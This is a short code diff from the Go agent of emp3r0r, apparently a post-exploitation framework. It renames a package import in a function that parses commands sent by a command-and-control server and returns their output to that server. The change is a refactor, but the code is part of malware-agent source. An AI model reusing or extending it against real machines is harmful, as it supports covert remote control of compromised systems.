@@ -13,7 +13,7 @@ import (
 	"strings"
 	"time"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/otiai10/copy"
@@ -21,18 +21,18 @@ import (
 )
 
 // exec cmd, receive data, etc
-func processCCData(data *emp3r0r_data.MsgTunData) {
+func processCCData(data *emp3r0r_def.MsgTunData) {
 	var (
-		data2send emp3r0r_data.MsgTunData
+		data2send emp3r0r_def.MsgTunData
 		out       string
 		err       error
 	)
 	data2send.Tag = RuntimeConfig.AgentTag
 
-	payloadSplit := strings.Split(data.Payload, emp3r0r_data.MagicString)
+	payloadSplit := strings.Split(data.Payload, emp3r0r_def.MagicString)
 	if len(payloadSplit) <= 1 {
 		log.Printf("Cannot parse CC command: %s, wrong OpSep (should be %s) maybe?",
-			data.Payload, emp3r0r_data.MagicString)
+			data.Payload, emp3r0r_def.MagicString)
 		return
 	}
 	cmd_id := payloadSplit[len(payloadSplit)-1]
@@ -49,11 +49,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	// send response to CC
 	sendResponse := func(resp string) {
 		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
-			emp3r0r_data.MagicString,
+			emp3r0r_def.MagicString,
 			strings.Join(cmdSlice, " "),
-			emp3r0r_data.MagicString,
+			emp3r0r_def.MagicString,
 			resp)
-		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
+		data2send.Payload += emp3r0r_def.MagicString + cmd_id // cmd_id for cmd tracking
 		if err = Send2CC(&data2send); err != nil {
 			log.Println(err)
 		}
